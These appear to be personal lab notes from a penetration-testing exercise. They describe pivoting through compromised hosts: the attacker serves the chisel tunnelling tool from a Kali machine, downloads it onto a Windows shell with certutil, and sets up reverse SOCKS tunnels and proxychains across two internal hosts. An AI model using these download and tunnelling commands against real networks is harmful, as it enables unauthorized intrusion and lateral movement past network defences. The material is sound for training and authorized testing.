setup python http server in /opt
```bash
┌──(root㉿kali)-[/opt/chisel]
└─# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.110.3 - - [14/Aug/2023 17:48:37] "GET /chisel_windows HTTP/1.1" 200 -
10.10.110.3 - - [14/Aug/2023 17:48:43] "GET /chisel_windows HTTP/1.1" 200 -
```
grabbed chisel over to joe-lptp
```shell
C:\Users\adm1n\Desktop>certutil -urlcache -split -f "http://10.10.16.7:8000/chisel_windows"
certutil -urlcache -split -f "http://10.10.16.7:8000/chisel_windows"
****  Online  ****
  000000  ...
  846600
CertUtil: -URLCache command completed successfully.

C:\Users\adm1n\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D946-97E4

 Directory of C:\Users\adm1n\Desktop

08/14/2023  02:48 PM    <DIR>          .
08/14/2023  02:48 PM    <DIR>          ..
08/14/2023  02:49 PM         8,676,864 chisel_windows
08/14/2023  02:44 PM           207,360 rev2.exe
               2 File(s)      8,884,224 bytes
               2 Dir(s)  16,608,575,488 bytes free

C:\Users\adm1n\Desktop>

```
setting up chisel reverse server on NIX01
```bash
root@NIX01:~# ./chisel_nix server --socks5 --reverse -p 1001
```
setting up chisel reverse clien on JOE-LPTP
- had to rename this to chisel.exe - was previously chisel_windows
```bash
chisel.exe client 172.16.1.23:1001 R:2080:socks
```
edited the /etc/proxychains4 file
![[Pasted image 20230814181504.png]]
### The Proxychains story so far

->Kali - Attacking machine 10.10.16.7
--> 10.10.110.123 NIX01 on port 1080
---> 172.16.1.201 JOE-LPTP on port 2080